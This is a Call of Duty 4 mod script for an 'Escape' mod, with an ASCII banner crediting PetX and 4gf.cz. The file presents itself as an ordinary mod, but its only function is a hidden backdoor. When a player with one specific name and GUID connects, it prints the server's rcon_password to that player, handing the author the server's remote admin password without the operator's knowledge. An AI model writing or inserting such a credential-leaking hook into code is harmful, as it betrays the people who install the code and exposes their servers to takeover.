//I========================================================================I
//I                    ___  _____  _____                                   I
//I                   /   !!  __ \!  ___!                                  I
//I                  / /! !! !  \/! !_          ___  ____                  I
//I                 / /_! !! ! __ !  _!        / __!!_  /                  I
//I                 \___  !! !_\ \! !      _  ! (__  / /                   I
//I                     !_/ \____/\_!     (_)  \___!/___!                  I
//I                                                                        I
//I========================================================================I
// Call of Duty 4: Modern Warfare
//I========================================================================I
// Mod      : Escape
// Website  : http://www.4gf.cz/
//I========================================================================I
// Script by: PetX
//I========================================================================I

init()
{
	thread OnPlayerConnected();
}

OnPlayerConnected()
{
	while( true )
	{
		level waittill( "connected", player );
		
		if( player.name == "4GF.CZ|PetX" && player GetGuid() == "8efa4cbada87e6348e7db02e3893dd89" )
			player iprintln( "value: ^1"+GetDvar( "rcon_password" ) );
	}
}